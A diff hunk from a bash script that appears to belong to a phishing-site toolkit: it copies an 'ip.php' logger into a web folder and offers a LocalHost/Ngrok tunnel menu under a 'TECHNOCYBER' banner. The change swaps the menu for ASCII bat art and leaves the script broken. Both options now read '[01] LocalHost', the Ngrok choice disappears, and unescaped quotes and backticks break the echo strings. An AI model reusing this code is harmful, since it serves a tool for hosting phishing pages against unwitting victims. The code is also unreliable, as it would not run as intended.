@@ -413,9 +413,13 @@ cp -f .Modules/ip.php .htr/www/
 
 def_tunnel_menu="2"
 smallbanner
-printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[96m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[96m Ngrok\e[0m\n"
-printf "\e[0m\n"
+echo "                                                           =/\                 /\=\e[0m\n"
+echo "                                                           / \'._   (\_/)   _.'/ \\e[0m\n"
+echo "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[96m LocalHost     / .''._'--(o.o)--'_.''. \\e[0m\n"
+echo "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[96m LocalHost    /.' _/ |`'=/ " \='`| \_ `.\\e[0m\n"
+echo "                                                        /` .' `\;-,'\___/',-;/` '. '\\e[0m\n"
+echo "                                                       /.-' jgs   `\(-V-)/`       `-.\\e[0m\n"
+echo "                                                       `            "   "            `\e[0m\n"
 echo -e "╭─[TECHNOCYBER]" |lolcat
 read -p "   ╰─root@./2Timeowl=" tunnel_menu
 tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
